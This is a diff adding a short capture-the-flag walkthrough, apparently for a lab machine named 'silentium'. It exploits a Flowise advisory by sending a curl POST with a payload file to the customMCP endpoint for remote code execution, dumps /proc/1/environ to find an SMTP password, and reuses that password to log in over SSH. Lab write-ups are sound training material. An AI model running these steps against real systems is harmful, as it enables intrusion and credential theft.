@@ -1,0 +1,32 @@
+Source:     https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-3gcm-f6qx-ff7p
+
+########## GET API KEY FROM DASHBOARD ##########
+Key: hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc
+
+
+########## FIRE REMOTE CODE EXECUTION ##########
+$> curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
+    -H "Content-Type: application/json" \
+    -H "Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc" \
+    -d @payload.json
+
+
+########## GET SSH CREDENTIALS FOR "BEN" USER ##########
+$> cat /proc/1/environ | tr '\0' '\n'
+
+    NOTE: Since it's an isolated docker environment, we tried to see if there are credentials
+          in its environment variables, which turned out there were. In this case, "proc/1"
+          refers to the docker process.
+
+[...]
+SMTP_PASSWORD=r04D!!_R4ge
+[...]
+
+
+########## ACCESS THROUGH SSH AS "BEN" ##########
+$> ssh ben@10.129.29.121    # Password: r04D!!_R4ge
+
+Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-107-generic x86_64)
+[...]
+ben@silentium:~$
+
